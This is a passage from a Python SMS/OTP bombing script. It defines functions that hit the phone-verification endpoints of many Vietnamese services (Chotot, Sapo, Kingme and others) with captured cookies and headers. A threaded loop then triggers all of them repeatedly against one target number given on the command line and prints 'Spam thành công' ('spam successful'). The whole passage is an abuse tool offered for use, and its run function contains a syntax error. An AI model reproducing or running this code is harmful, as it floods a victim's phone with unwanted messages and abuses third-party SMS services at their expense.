        'phoneNumber': phone,
    }

    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
def chotot(phone):
    cookies = {
        'ipqsd': '341942561532813760',
        'device_id_1721542005': 'PG6FXZbjBE-1721542005',
        'ct-idfp': 'ce5d2928-a3c2-5165-88e8-bb4cd213c649',
        '_cfuvid': 'ORpuQ1Ac0n2fXd3xJ.G_iDI2pBJopaKiqt_6RDvSR.Q-1721974830041-0.0.1.1-604800000',
        'cf_clearance': 'rsXXH9bbBRznYM9.JdvJKjnnIkoxUeaxnvszMoz4se4-1721974832-1.0.1.1-H27burCUSc0WWyuAiZi3AcIC8kk7_p1K9dsO3cG7QYWCfh5eXh1fTKAjscFL2EH4UhWZzc4BnbyZgrjTOwTUyQ',
    }

    headers = {
        'authority': 'id.chotot.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=df6d9c7e225640bfad7e87f097cc4fe9,sentry-sample_rate=0.1',
        'referer': 'https://id.chotot.com/register',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': 'df6d9c7e225640bfad7e87f097cc4fe9-968a246074f5abf4-0',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-nextjs-data': '1',
    }

    params = {
        'phone': phone,
    }

    response = requests.get(
        'https://id.chotot.com/_next/data/aL54km2oo9eriIzv-Ickg/register/otp.json',
        params=params,
        cookies=cookies,
        headers=headers
    )
    

def sapo(phone):
    cookies = {
    '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_gid': 'GA1.2.312311746.1721136107',
    '_fbp': 'fb.1.1721136112829.278874665245209803',
    '_ce.irv': 'new',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'G_ENABLED_IDPS': 'google',
    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'lang': 'vi',
    'referral': 'https://accounts.sapo.vn/',
    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'start_time': '07/16/2024 20:50:23',
    '_dc_gtm_UA-66880228-3': '1',
    'pageview': '2',
    '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
    'cebsp_': '8',
    '_dc_gtm_UA-66880228-1': '1',
    '_gat_UA-239546923-1': '1',
    '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
    '_ga': 'GA1.1.1203051188.1721136107',
    '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
    '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
    '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
    '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
    '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
    '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
    '_ce.s': 'v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457',
    '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_hjSessionUser_3167213=eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3167213=eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.312311746.1721136107; _fbp=fb.1.1721136112829.278874665245209803; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; G_ENABLED_IDPS=google; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; lang=vi; referral=https://accounts.sapo.vn/; landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=07/16/2024 20:50:23; _dc_gtm_UA-66880228-3=1; pageview=2; _ga_4NX0F91DEX=GS1.2.1721136112.1.1.1721137827.0.0.0; cebsp_=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga_YNVPPJ8MZP=GS1.1.1721136164.1.1.1721137832.50.0.0; _ga=GA1.1.1203051188.1721136107; _ga_GECRBQV6JK=GS1.1.1721136164.1.1.1721137833.49.0.0; _ga_8956TVT2M3=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_HXMGB9WRVX=GS1.1.1721136159.1.1.1721137833.60.0.0; _ga_CDD1S5P7D4=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_Y9YZPDEGP0=GS1.1.1721136163.1.1.1721137833.49.0.0; _ga_EBZKH8C7MK=GS1.2.1721136166.1.1.1721137833.0.0.0; _ga_P9DPF3E00F=GS1.1.1721136112.1.1.1721137846.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1721136165.1.1.1721137847.35.0.0; _ce.s=v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457; _gcl_au=1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
    'origin': 'https://www.sapo.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = {
    'phonenumber': phone,
}

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
import concurrent.futures
import time
import sys

# Define your functions here
functions = [
    chotot, tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu,
    tgdt, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana,
    med, ghn, shop, sms3, gala, fa, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon, 
        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
        send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
        send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
        send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
        send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
        send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
        send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
        send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
        send_otp_via_batdongsan, send_otp_via_GUMAC,  send_otp_via_vietloan2, send_otp_via_FAHASA, send_otp_via_hopiness,
        send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
        send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
        send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
]

def run(phone,sdt i):
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Generated an exception: {exc}')

    print(f"Spam thành công lần {i}")
    for j in range(4, 0, -1):
        print(f"Vui lòng chờ {j} giây", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python sms.py <phone_number> <count>")
        sys.exit(1)
    
    phone = sys.argv[1]  # Fetch phone number from command-line argument
    count = int(sys.argv[2])  # Fetch count from command-line argument

    for i in range(1, count + 1):
        run(phone, i)